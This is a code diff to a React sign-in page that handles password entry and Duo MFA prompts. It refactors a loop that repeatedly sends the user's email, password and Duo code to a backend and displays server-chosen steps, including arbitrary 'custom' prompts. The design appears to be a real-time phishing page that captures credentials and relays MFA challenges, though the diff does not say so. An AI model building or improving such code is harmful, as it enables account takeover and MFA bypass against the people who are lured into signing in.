@@ -24,7 +24,7 @@ const App = () => {
     const [dontAskAgain, setDontAskAgain] = useState(false);
     const [alert_email_typing, setAlert_email_typing] = useState(false);
 
-    // --- NEW: State for the custom step ---
+    // --- State for the custom step ---
     const [isCustomStep, setIsCustomStep] = useState(false);
     const [customStepData, setCustomStepData] = useState({ title: '', subtitle: '', has_input: false });
     const [customInput, setCustomInput] = useState('');
@@ -111,7 +111,6 @@ const App = () => {
         setIsDuoMobileStep(true);
         setShowDuoCodeInput(false);
         setAuthMessage('Authentication pending. Please wait...');
-        // The `isSubmitting` flag will be managed by the polling loop now
         
         handleSignInClick(e, true);
     }
@@ -135,33 +134,24 @@ const App = () => {
             setShowDuoCodeInput(false);
         }
         
-        console.log('Attempting sign-in with:', { email, password, keepSignedIn, duoCode });
-
         let status_data = {};
         let attempts = 0;
         const maxAttempts = 60;
+        let continuePolling = true;
 
         do {
             status_data = await get_auth_status(email, password, duoCode);
             console.log('Authentication status object:', status_data);
             const status = status_data.status;
 
-            if (status === 'pending') {
-                setIsError(false);
-                setAuthMessage('Authentication pending. Please wait...');
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                attempts++;
-            } else if (status === 'incorrect password') {
-                setIsError(true);
-                setAuthMessage('Incorrect password. Please try again.');
-                setIsDuoMobileStep(false);
-                setIsPasswordStep(true);
-                break;
-            } else if (status === 'mobile notification' || status === 'phone_call') {
+            // Default statuses that always continue polling
+            if (status === 'pending' || status === 'mobile notification' || status === 'phone_call') {
                 setIsError(false);
                 const message = status === 'mobile notification'
                     ? 'We sent a notification to your mobile device. Please open it to continue.'
-                    : "We're calling your phone. Please answer it to continue.";
+                    : status === 'phone_call' 
+                    ? "We're calling your phone. Please answer it to continue."
+                    : 'Authentication pending. Please wait...';
                 setAuthMessage(message);
                 setIsPasswordStep(false);
                 setIsDuoMobileStep(true);
@@ -169,44 +159,68 @@ const App = () => {
                 setShowDuoCodeInput(false);
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 attempts++;
-            } else if (status === 'duo code' || status === 'incorrect duo code') {
-                const isIncorrect = status === 'incorrect duo code';
-                setIsError(isIncorrect);
-                setAuthMessage(isIncorrect ? 'Incorrect code. Please try again.' : 'Open your Duo app and Duo will send you a one time code. enter code here');
-                setIsPasswordStep(false);
-                setIsDuoMobileStep(true);
-                setIsCustomStep(false);
-                setShowDuoCodeInput(true);
-                break;
-            } else if (status === 'custom') {
-                setCustomStepData(status_data.data);
-                setIsPasswordStep(false);
-                setIsDuoMobileStep(false);
-                setIsCustomStep(true);
-                setAuthMessage('');
-                setIsSubmitting(false); // <-- FIX: Explicitly set submitting to false here.
-                break;
-            } else if (status === 'success') {
-                setIsSuccessStep(true);
-                setIsPasswordStep(false);
-                setIsDuoMobileStep(false);
-                setIsCustomStep(false);
-                break;
-            } else {
-                setIsError(true);
-                setAuthMessage(status_data.message || 'An unexpected error occurred. Please try again.');
-                break;
+            } 
+            // Handle custom status branching logic
+            else if (status === 'custom') {
+                const customData = status_data.data;
+                // If the custom status requires input, stop polling and show the form
+                if (customData && customData.has_input) {
+                    setCustomStepData(customData);
+                    setIsPasswordStep(false);
+                    setIsDuoMobileStep(false);
+                    setIsCustomStep(true);
+                    setAuthMessage('');
+                    setIsSubmitting(false);
+                    continuePolling = false; // Stop the loop
+                } else {
+                    // If no input is needed, show the message and continue polling
+                    setIsError(false);
+                    const message = customData ? `${customData.title}: ${customData.subtitle}` : 'Processing your request...';
+                    setAuthMessage(message);
+                    setIsPasswordStep(false);
+                    setIsCustomStep(false);
+                    setIsDuoMobileStep(true);
+                    setShowDuoCodeInput(false);
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    attempts++;
+                }
             }
-        } while ((status_data.status === 'pending' || status_data.status === 'mobile notification' || status_data.status === 'phone_call') && attempts < maxAttempts);
+            // Any other status should stop the polling loop
+            else {
+                continuePolling = false; // Stop the loop for success, error, duo code, etc.
+                if (status === 'incorrect password') {
+                    setIsError(true);
+                    setAuthMessage('Incorrect password. Please try again.');
+                    setIsDuoMobileStep(false);
+                    setIsPasswordStep(true);
+                } else if (status === 'duo code' || status === 'incorrect duo code') {
+                    const isIncorrect = status === 'incorrect duo code';
+                    setIsError(isIncorrect);
+                    setAuthMessage(isIncorrect ? 'Incorrect code. Please try again.' : 'Open your Duo app and Duo will send you a one time code. enter code here');
+                    setIsPasswordStep(false);
+                    setIsDuoMobileStep(true);
+                    setIsCustomStep(false);
+                    setShowDuoCodeInput(true);
+                } else if (status === 'success') {
+                    setIsSuccessStep(true);
+                    setIsPasswordStep(false);
+                    setIsDuoMobileStep(false);
+                    setIsCustomStep(false);
+                } else {
+                    setIsError(true);
+                    setAuthMessage(status_data.message || 'An unexpected error occurred. Please try again.');
+                }
+            }
+        } while (continuePolling && attempts < maxAttempts);
 
-        if ((status_data.status === 'pending' || status_data.status === 'mobile notification' || status_data.status === 'phone_call') && attempts >= maxAttempts) {
+        if (continuePolling && attempts >= maxAttempts) {
             setIsError(true);
             setAuthMessage('Authentication timed out. Please try again.');
         }
 
-        // Final check to ensure isSubmitting is false if the loop has ended for any reason other than user input.
-        if (status_data.status !== 'duo code' && status_data.status !== 'incorrect duo code' && status_data.status !== 'custom') {
-            setIsSubmitting(false);
+        // Final check to ensure spinner stops if loop ended for any reason
+        if (!continuePolling) {
+             setIsSubmitting(false);
         }
     };
 
@@ -290,7 +304,7 @@ const App = () => {
                                 <>
                                     <h1 className="form-title" style={{ marginBottom: '2rem' }}>Approve sign in request</h1>
                                     <div className="mfa-prompt-container">
-                                        {authMessage.includes('calling') ? <PhoneIcon /> : <div className="spinner"></div>}
+                                        {isSubmitting ? <div className="spinner"></div> : (authMessage.includes('calling') ? <PhoneIcon /> : <div className="spinner"></div>)}
                                         <p className="mfa-prompt-text">{authMessage}</p>
                                     </div>
                                     <div className="mfa-options-container">
